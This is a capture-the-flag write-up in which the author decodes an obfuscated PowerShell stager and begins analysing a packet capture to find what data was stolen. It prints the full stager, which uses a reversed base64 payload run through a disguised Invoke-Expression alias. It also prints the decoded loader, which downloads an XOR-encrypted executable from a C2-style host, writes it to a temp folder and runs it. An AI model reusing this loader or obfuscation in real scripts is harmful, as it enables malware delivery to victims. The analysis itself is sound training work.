# Only riches can be stolen

## The prompt

"Oh no, I got tricked into executing a malicious script Luckily I capture all traffic leaving my network. Can you find out what data was stolen?"

## My approach

I had some trouble with this one since I have beef with powershell and windows in general, I try to stay as far away from it as possible.

But in fact I had to get to work if I ever wanted to get this flag so let's go through the first script:

```
$best64code = "KoQfKQXa4VGIgACIKsHIoNGdhNGI9pAdpF2VtACUkRCIoRXYQVGbpZULgM3clN2byBVL0JXY0NFIgACIKsHI5JHdKoQfKQXa4VGIgACIKsHIoNGdhNGI9pQKkRCIsAFZkgyclRXeCxGbBVGdpJ3V6oTXlxWaG5yTJ5SblR3c5N1WgACIgowegknc0pgC9pAdphXZgACIgowegg2Y0F2Yg0nCrRCIr1CI05WZ052bD5SZkACZtACRg0DIkRCIgACIKsHI5JHdK0gCN0nCNQXa4VGIgACIK0wegg2Y0F2Yg0nCNA3b0NFIu9Wa0NWQy9mcyVULgQXZHBCZvhGdl1ULgcmbpNnchB1YpNXYCV2cV1CI1RCIpJXVtACdzVWdxVmUiV2VtU2avZnbJBSPgUGJgACIgoQD7BSeyRnCNoQD9pQDvRCIuJXd0VmcgACIgoQD9BCIgAiCNsGJgI3b4JWLgIGJg0zKg8GJgACIgACIgAiCNsHIpQGJg4WagIGJoACajFWZy9mZgACIgoQDpgCQg0DIvRCIgACIK0QKgACIgoQDrRSXlRXeitFIgACIgACIgoQDsQGJd11WlRXeitFIgACIgACIgoQDo0WYyFGcgACIgoQD7BCRg42bpR3YuVnZK0gCNogIlhXZu0WYyd2byBFdpdWZMJCIoRXYQRGbph2QtACR0RCIoRXYQ1CIoRXYQ1ibp9mSg0DIQRGJKogCpgCa0FGUw1WZURXZHpjOdhGdhBlLPlkLtVGdzl3UbBSPgQEdkogCNIDN4BDI9AyakoQDiUGel5SbhJ3ZvJHU0l2Zlx0Lt92YuIzYhR3bulHbsFGdvR3LvoDc0RHaiASPgUHJ" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
$LoadCoDe = [SyStem.teXT.ENCODIng]::uTF8.GetSTRing([sysTeM.cONVeRT]::fRoMbAse64stRing("$BAsE64")) ;
$pWn = "I"+"n"+"v"+"O"+"K"+"E"+"-"+"E"+"X"+"P"+"r"+"e"+"S"+"s"+"i"+"O"+"n" ; nEw-ALiAS -NAMe pWn -vaLUE $PWN -forcE ; Pwn $LOaDCOdE ;
```

As you can see it comes with some more code inside it that is encoded with base64.

After decoding it they run the script with a newly created alias.

Since everything is right in front of us I didn't bother using anything fancy to decode it, I just changed the script to look like this:

```
$best64code = "KoQfKQXa4VGIgACIKsHIoNGdhNGI9pAdpF2VtACUkRCIoRXYQVGbpZULgM3clN2byBVL0JXY0NFIgACIKsHI5JHdKoQfKQXa4VGIgACIKsHIoNGdhNGI9pQKkRCIsAFZkgyclRXeCxGbBVGdpJ3V6oTXlxWaG5yTJ5SblR3c5N1WgACIgowegknc0pgC9pAdphXZgACIgowegg2Y0F2Yg0nCrRCIr1CI05WZ052bD5SZkACZtACRg0DIkRCIgACIKsHI5JHdK0gCN0nCNQXa4VGIgACIK0wegg2Y0F2Yg0nCNA3b0NFIu9Wa0NWQy9mcyVULgQXZHBCZvhGdl1ULgcmbpNnchB1YpNXYCV2cV1CI1RCIpJXVtACdzVWdxVmUiV2VtU2avZnbJBSPgUGJgACIgoQD7BSeyRnCNoQD9pQDvRCIuJXd0VmcgACIgoQD9BCIgAiCNsGJgI3b4JWLgIGJg0zKg8GJgACIgACIgAiCNsHIpQGJg4WagIGJoACajFWZy9mZgACIgoQDpgCQg0DIvRCIgACIK0QKgACIgoQDrRSXlRXeitFIgACIgACIgoQDsQGJd11WlRXeitFIgACIgACIgoQDo0WYyFGcgACIgoQD7BCRg42bpR3YuVnZK0gCNogIlhXZu0WYyd2byBFdpdWZMJCIoRXYQRGbph2QtACR0RCIoRXYQ1CIoRXYQ1ibp9mSg0DIQRGJKogCpgCa0FGUw1WZURXZHpjOdhGdhBlLPlkLtVGdzl3UbBSPgQEdkogCNIDN4BDI9AyakoQDiUGel5SbhJ3ZvJHU0l2Zlx0Lt92YuIzYhR3bulHbsFGdvR3LvoDc0RHaiASPgUHJ" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
$LoadCoDe = [SyStem.teXT.ENCODIng]::uTF8.GetSTRing([sysTeM.cONVeRT]::fRoMbAse64stRing("$BAsE64")) ; echo "$LoadCoDe";
```

Now that we have decoded the "hidden" in plain sight script let's analyze that:

```
$u = "http://totallynotac2.com/LegitProgram.exe"
$k = 0x42

$tD = [System.IO.Path]::GetTempPath()


$dP = Join-Path -Path $tD -ChildPath "LegitProgram.exe"


function D {
    param(
        [byte[]]$d,
        [byte]$k
    )
    $o = @()
    foreach ($b in $d) {
        $o += $b -bxor $k
    }
    return $o
}

try {
    $e = Invoke-WebRequest -Uri $u -UseBasicParsing -Method Get -ErrorAction Stop
} catch {
    exit
}

try {
    $d = D -d $e.Content -k $k
} catch {
    exit
}

try {
    [System.IO.File]::WriteAllBytes($dP, $d)
} catch {
    exit
}

try {
    Start-Process -FilePath $dP -Wait
} catch {
    exit
}
```

As we can see it initializes a few variables, makes a function and runs a few try-catch exceptions. Let's break it down step by step:

- Put url in string
- Declare xor key
- Get a temp path in the filesystem to put the program in
- Then it makes a function to decrypt the newly acquired program
- Sends the actual GET request to the server
- Decrypt the file
- Write it do the disk
- Execute the new program

Let's not forget the main objective here is to find out what this program steals from our user.

Let's anylyze the `.pcapng` file we have here.

![image](./assets/20240623_11h44m28s_grim.png)

Just from the prompt alone and what we've discovered so far I'm pretty sure that it's the LegitProgram.exe doing the POST request. 

So by finding out what got sent in that POST request we can figure out what data got stolen!
